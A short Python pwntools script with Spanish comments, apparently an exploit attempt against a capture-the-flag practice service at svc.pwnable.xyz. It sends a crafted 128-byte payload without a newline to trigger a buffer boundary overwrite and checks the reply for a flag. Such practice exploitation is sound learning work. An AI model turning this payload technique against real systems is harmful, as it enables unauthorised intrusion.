#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Enviar EXACTAMENTE 128 bytes + 2 bytes más SIN newline
# Para que read lea 128 y ponga null en 127
# Pero luego si envío más, quizás...

payload = b'S' * 126 + b'\x80\x10'
log.info(f"Enviando {len(payload)} bytes SIN newline...")

# send en lugar de sendline para NO agregar \n
conn.send(payload)

time.sleep(0.5)

data = conn.recvall(timeout=3)
log.info(f"Respuesta: {data}")

if b'FLAG{' in data and b'will_be_here' not in data:
    log.success("¡FLAG REAL!")

conn.close()